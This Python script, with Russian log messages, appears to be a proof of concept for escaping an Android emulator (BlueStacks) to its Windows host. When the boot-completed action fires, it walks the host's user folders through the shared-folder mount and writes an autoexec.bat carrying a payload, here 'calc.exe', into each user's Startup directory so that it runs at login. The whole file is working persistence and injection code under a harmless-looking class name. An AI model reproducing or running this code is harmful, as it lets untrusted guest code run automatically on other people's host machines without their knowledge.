import os
import logging

# Настройка логирования с записью в файл
logging.basicConfig(level=logging.DEBUG, filename='system_manager.log', 
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("SystemManager")

class SystemManager:
    def __init__(self):
        self.shared_drive = "/mnt/windows/BstSharedFolder/"
        self.user_directories = os.path.join(self.shared_drive, "Users")

    def on_receive(self, action):
        if action == "BOOT_COMPLETED":
            self.inject_payload("calc.exe")

    def inject_payload(self, payload):
        users = self.list_users()
        if not users:
            logger.warning("Список пользователей пуст или не удалось его получить.")
            return

        for user in users:
            self.add_payload_to_startup(user, payload)

    def list_users(self):
        if not os.path.exists(self.user_directories):
            logger.error(f"Директория {self.user_directories} не существует.")
            return []

        try:
            return [user for user in os.listdir(self.user_directories) 
                    if user not in ["Public", "Default", "All Users", "desktop.ini"]]
        except Exception as e:
            logger.error(f"Ошибка при перечислении пользователей: {e}")
            return []

    def add_payload_to_startup(self, user_name, payload):
        startup_dir = os.path.join(self.user_directories, user_name, 
                                   "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
        if not os.path.exists(startup_dir) or not os.path.isdir(startup_dir):
            logger.error(f"Невозможно получить доступ к {startup_dir}; пропуск")
            return
        
        try:
            with open(os.path.join(startup_dir, "autoexec.bat"), "w") as file:
                file.write(payload)
            logger.info(f"Пейлоад успешно добавлен для пользователя {user_name}")
        except Exception as e:
            logger.error(f"Ошибка при добавлении пейлоада для пользователя {user_name}: {e}")


if __name__ == "__main__":
    manager = SystemManager()
    manager.on_receive("BOOT_COMPLETED")
